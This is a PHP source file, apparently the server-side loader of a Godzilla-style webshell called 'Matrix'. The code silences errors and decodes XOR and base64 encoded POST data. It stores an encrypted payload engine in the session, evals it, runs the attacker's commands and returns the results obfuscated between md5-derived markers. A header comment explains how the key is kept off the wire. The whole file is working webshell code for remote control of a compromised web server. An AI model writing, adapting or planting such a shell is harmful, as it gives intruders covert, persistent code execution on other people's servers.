/*
 * Matrix Godzilla eval loader (PHP_EVAL_XOR_BASE64).
 *
 * This file never carries key material: the one-line shell that evals it
 * defines `$mxk` (key16) in the same scope first, so the loader can reference
 * it. The data parameter name is the fixed, non-secret `mxdata` instead of the
 * secretKey, so no key material travels on the wire.
 *
 * The loader is base64+reversed+urlencoded on the wire (obfuscation, NOT
 * encryption), so the eval cryption still requires HTTPS.
 */
@session_start();
@set_time_limit(0);
@error_reporting(0);

if (!isset($mxk)) {
    echo 'Matrix eval shell required';
    return;
}

$pass = 'mxdata';
$key = $mxk;
$name = 'payload';

function mx_xor($data, $key)
{
    $out = '';
    $len = strlen($data);
    for ($i = 0; $i < $len; $i++) {
        $out .= $data[$i] ^ $key[($i + 1) & 15];
    }
    return $out;
}

if (isset($_POST[$pass])) {
    $data = mx_xor(base64_decode($_POST[$pass]), $key);
    if (isset($_SESSION[$name])) {
        $engine = mx_xor($_SESSION[$name], $key);
        if (strpos($engine, 'getBasicsInfo') === false) {
            $engine = mx_xor($engine, $key);
        }
        eval($engine);
        $mark = md5($pass . $key);
        echo substr($mark, 0, 16);
        echo base64_encode(mx_xor(@run($data), $key));
        echo substr($mark, 16);
    } else {
        if (strpos($data, 'getBasicsInfo') !== false) {
            $_SESSION[$name] = mx_xor($data, $key);
        }
    }
}
